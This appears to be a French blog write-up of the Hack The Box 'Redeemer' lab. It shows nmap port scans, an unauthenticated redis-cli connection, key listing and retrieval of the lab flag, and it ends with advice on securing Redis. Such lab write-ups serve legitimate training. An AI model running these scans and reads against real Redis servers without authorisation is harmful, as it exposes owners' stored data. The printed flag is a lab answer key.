---
title: Starting Point Redeemer - Hack the Box 
date: 2025-03-05
tags: [HackTheBox, Redis, DataBases, VeryEasy]
categories: writeups
keywords: 'Redis Hack the box'
description: Box Starting point  - Hack the box 
cover: images/writeups/REDEEMER/image.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: true
---
### Introduction

Le challenge **"Redeemer"** sur Hack The Box nous amène à interagir avec un service Redis sur un serveur à distance. Redis est un **système de gestion de base de données en mémoire**, utilisé principalement pour la mise en cache de données et la gestion de données temporaires. L'objectif de ce challenge est d'exploiter un serveur Redis pour obtenir un flag.

### Étape 1: Identifier le Port Ouvert

La première étape consiste à déterminer quel port est ouvert sur la machine cible. Nous avons utilisé **Nmap** pour scanner les ports :

```bash
┌──(jolan㉿jolan)-[~]
└─$ nmap -p- -sS -min-rate=10000 -T5 10.129.136.187
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 11:21 CET
Warning: 10.129.136.187 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.136.187
Host is up (0.026s latency).
Not shown: 63528 closed tcp ports (reset), 2006 filtered tcp ports (no-response)
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds

```

Le scan a révélé que le port **6379** est ouvert, et le service qui l'occupe est **Redis**.

### Étape 2: Identifier le Service Redis

Une fois que le port est identifié, nous avons effectué un autre scan Nmap pour obtenir plus d'informations sur le service qui s'exécute sur ce port. Le résultat indique que Redis est bien en fonctionnement :

```bash
┌──(jolan㉿jolan)-[~]
└─$ nmap -p 6379 -sV 10.129.136.187
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 11:24 CET
Nmap scan report for 10.129.136.187
Host is up (0.033s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds

```

Il est confirmé que **Redis version 5.0.7** est en cours d'exécution sur le port 6379.

### Étape 3: Comprendre Redis

Redis est un **système de gestion de base de données en mémoire** utilisé principalement pour le **stockage de données temporaires** et la **mise en cache**. Il permet de stocker des paires clé-valeur et peut être utilisé pour partager des données entre plusieurs serveurs.

### Étape 4: Se Connecter à Redis

Pour interagir avec Redis, l'outil **redis-cli** est utilisé. Il permet d'exécuter des commandes Redis depuis la ligne de commande. La commande suivante permet de se connecter à la machine cible via **redis-cli** :

```bash
redis-cli -h 10.129.136.187

```

Une fois connecté, vous obtenez un prompt où vous pouvez exécuter des commandes Redis.

### Étape 5: Obtenir des Informations sur le Serveur Redis

La commande suivante fournit des informations et des statistiques sur le serveur Redis :

```bash
10.129.136.187:6379> info

```

Le résultat montre diverses informations sur le serveur, y compris la version de Redis, l'OS utilisé, et le nombre de clés dans la base de données.

### Étape 6: Explorer les Clés de Redis

Ensuite, nous avons utilisé la commande `keys *` pour lister toutes les clés stockées dans la base de données Redis :

```bash
10.129.136.187:6379> keys *
1) "temp"
2) "numb"
3) "stor"
4) "flag"

```

Quatre clés sont présentes : **temp**, **numb**, **stor**, et **flag**.

### Étape 7: Extraire les Valeurs des Clés

Nous avons ensuite utilisé la commande `get` pour récupérer les valeurs associées à ces clés :

```bash
10.129.136.187:6379> get temp
"1c98492cd337252698d0c5f631dfb7ae"

10.129.136.187:6379> get numb
"bb2c8a7506ee45cc981eb88bb81dddab"

10.129.136.187:6379> get stor
"e80d635f95686148284526e1980740f8"

10.129.136.187:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"

```

La valeur de la clé **flag** est le flag que nous recherchions :

```
03e1d2b376c37ab3f5319922053953eb

```

### Conclusion

Dans ce challenge, nous avons utilisé **Nmap** pour découvrir le port ouvert, identifié le service **Redis** qui y était exécuté, et utilisé **redis-cli** pour interagir avec le serveur Redis. En explorant les clés stockées dans Redis, nous avons récupéré le **flag** qui était caché dans la clé **flag**.

Ce challenge met en lumière l'importance de sécuriser les services Redis, car un accès non autorisé à Redis peut permettre à un attaquant d'exploiter des informations sensibles stockées dans la base de données.